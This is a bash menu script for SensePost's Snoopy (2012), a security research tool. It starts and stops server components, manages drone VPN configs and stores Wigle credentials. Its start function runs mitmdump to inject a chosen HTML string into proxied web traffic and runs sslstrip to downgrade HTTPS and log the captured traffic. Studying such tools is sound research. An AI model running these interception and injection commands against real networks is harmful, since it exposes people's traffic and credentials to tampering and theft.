#!/bin/bash
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

snoopyDir=$(cd $(dirname "$0"); pwd)
cd $snoopyDir

source ./setup/config

pid_1=313373133
pid_2=313373133
pid_3=313373133
status=Checking...
num_drones=Checking...

# Agressively terminate other stale instances
killall mitmdump &> /dev/null
for i in `ps a | grep 'python' | grep  'snoopy_server.py\|sslstrip.py' | grep -v grep| cut -d " " -f 2`; do kill -9 $i &> /dev/null; done
clear

function snoopy_start {
	echo "[+] Stopping Snoopy (if it's running)"
	snoopy_stop
	echo "[+] Starting Snoopy..."
#	/etc/init.d/squid3 restart
	export PYTHONPATH=`pwd`/bin/snoopy/src/
	python ./bin/snoopy_server.py `pwd` &
	pid_1=$!
	search_for=$(cat ./setup/replace_match.txt)
	mitmdump -a 192.168.42.1 -p 3129 -P http://192.168.42.1:10000 "--replace-from-file=:~bs:$search_for:./setup/replace_html.txt" &>> /tmp/log.txt &
	#mitmdump -a 192.168.42.1 -p 3129 -P http://192.168.42.1:10000 "--replace-from-file=:~bs:</body>:./setup/replace_html.txt" &>> /tmp/log.txt &
	pid_2=$!
	python ./bin/sslstripSnoopy/sslstrip.py -w ./uploads/sslstrip_snoopy.log &> /dev/null &
	pid_3=$!

	#sleep 5
}

function snoopy_stop {
	#/etc/init.d/squid3 stop
	kill -2 $pid_1  &> /dev/null
	kill -9 $pid_2  &> /dev/null
	kill -9 $pid_3  &> /dev/null
	kill -9 $p &> /dev/null #In case we're tailing logs (option 6)
	#Just in case:
	killall mitmdump &> /dev/null
	for i in `ps a | grep 'python' | grep  'snoopy_server.py\|sslstrip.py' | grep -v grep| cut -d " " -f 2`; do kill -9 $i &> /dev/null; done
	clear
}

function watchdog {
	kill -0 $pid_1 &> /dev/null;a=$?
	kill -0 $pid_2 &> /dev/null;b=$?
	kill -0 $pid_3 &> /dev/null;c=$?
	if [ "$a" == "0" ] && [ "$b" == "0" ] && [ "$c" == "0" ];then
		status="\E[32;1mRunning\E[0m"
	else
		status="\E[31;1mStopped\E[0m"
	fi

	num_drones='\E[1m'`python bin/vpn_drones.py| wc -l`'\E[0m'
}

function config_menu {
source ./setup/config
wu="$(cat ./bin/wigle_creds.txt | cut -d ":" -f 1)"
lb="$(grep lookback ./transforms/common.py | cut -d '=' -f 2)"
clear
echo -en "
+---------------------------------------------------------------+
|                    Welcome to Snoopy V0.1                     |
|                  SERVER CONFIGURATION MENU                    |
|                                                               |
|              SensePost Information Security                   |
|          research@sensepost.com / wwww.sensepost.com          |
+---------------------------------------------------------------+
Server public IP:$vpn_server
Sync username: $rsync_user
Webroot:$web_root
Wigle User: $wu
Maltego lookback: $lb seconds

Would you like to:
[1] Set lookback for realtime Maltego transforms
[2] List Maltego transform URLs
[3] Set Wigle credentials
[x] Return to main menu

Option:"
input=""
read -n 1 input
#if [[ -z $input ]]; then
#        config_menu
#fi
echo ""                 

if [ "$input" == "1" ]; then
		               
		echo -n "Enter new lookback value in seconds (e.g. 300): "
		read num 
		expr $num + 1 2> /dev/null
		if [ $? = 0 ]; then
			sed -i "s/^lookback=.*/lookback=$num/" ./transforms/common.py
		else
			echo "Not valid number!"
			sleep 1
		fi

elif [ "$input" == "2" ]; then
	cat ./setup/transforms.txt
	echo "Press any key to return..."
	read -n 1 foo

elif [ "$input" == "3" ]; then
	c="$(cat ./bin/wigle_creds.txt | cut -d ":" -f 1,2)"
	echo "Existing Wigle credentials: "$c
        echo -n "Enter new username: "
        read -e user
	echo -n "Enter new password: "
	read -e pass
        if [ -z "$pass" ] || [ -z "$user" ] ; then
		echo "[!] Cannot be blank!"
		sleep 1
        else
      		echo $user:$pass: > ./bin/wigle_creds.txt
	fi


elif [[ "$input" == "x" || "$input" == "X" ]]; then
	conf_end=1
fi

#config_menu

}

function menu {
if [ -z $web_root ] || [ -z $vpn_server ] || [ -z $rsync_user ]; then
	echo "Some variables are not set, press any key to enter configuration menu"
	read -n 1
	config_menu
fi
wu="$(cat ./bin/wigle_creds.txt | cut -d ":" -f 1)"
watchdog
clear
echo -en "
+---------------------------------------------------------------+
|                    Welcome to Snoopy V0.1			|
|	  	         SERVER SIDE				|
|								|
|              SensePost Information Security                	|
|         research@sensepost.com / wwww.sensepost.com       	|
+---------------------------------------------------------------+
Date: `date`
Snoopy Server Status: $status
Connected Drones: $num_drones
Wigle User: $wu

Would you like to:
[1] (Re)Start Snoopy server components
[2] Stop Snoopy server components
[3] Manage drone configuration packs
[4] Configure server options
[5] Set web traffic injection string
[6] Observe logs
[X] Exit

[?] Help

Option:"
read -t 1 -n 1 input
if [[ -z $input ]]; then
	return
fi
#echo $?

echo ""                 

if [ "$input" == "1" ]; then
	echo Starting Snoopy....
	snoopy_start
elif [ "$input" == "2" ]; then
	echo Shutting down Snoopy...
	snoopy_stop
elif [ "$input" == "3" ]; then
	clear
	python ./bin/create_vpn_conf.py
	echo "Press any key to return to main Snoopy menu"
	read -n 1
elif [ "$input" == "4" ]; then
	conf_end=0
	while [ "$conf_end" -eq "0" ]
	do
        	config_menu
	done

elif [ "$input" == "5" ]; then
#	i=$(sed "s,\(^.*\)</body>$,\1," ./setup/replace_html.txt)
        echo "Current search string is:"
	echo "-------------------------"
	cat ./setup/replace_match.txt
	echo "-------------------------"
	echo ""
        echo "Current replace string is:"
        echo "-------------------------"
        cat ./setup/replace_html.txt
        echo "-------------------------"
	echo ""
	echo "Enter new search string, in one line (regex allowed): "
	read -e input
	echo "$input" > ./setup/replace_match.txt
        echo "Enter new replace string, in one line (regex allowed): "
        read -e input
        echo "$input" > ./setup/replace_html.txt
	echo "Done! Restart Snoopy to inact change."
	sleep 1

elif [ "$input" == "6" ]; then
	clear
	echo " *** Tailing log file, hit any key to return to Snoopy menu ***"
	echo ""
	tail -f ./logs/snoopy.log &
	p=$!
	read -n 1 key
	kill $p &> /dev/null
	clear
	
elif [[ "$input" == "x" || "$input" == "X" ]]; then
	echo "Shutting down Snoopy..."
	snoopy_stop
	cat ./setup/sn.txt
	end=1

elif [ "$input" == "?" ]; then
	more ../README.txt
else
	echo '
	       .-~~~~-.
	      / __     \
	     | /  \  /  `~~~~~-.
	     ||    |  0         @
	     ||    |  _.        |
	     \|    |   \       /
	      \    /  /`~~~~~~` \
	      ('--'""`)         WOOF, BAD INPUT!
	      /`"""""`\
	'
	sleep 1
fi
}

control_c()
{
  echo -en "\n*** Ouch! Exiting ***\n"
  snoopy_stop
  cat ./setup/sn.txt
  exit
}
trap control_c SIGINT


end=0
while [ "$end" -eq "0" ]
do
        menu
done

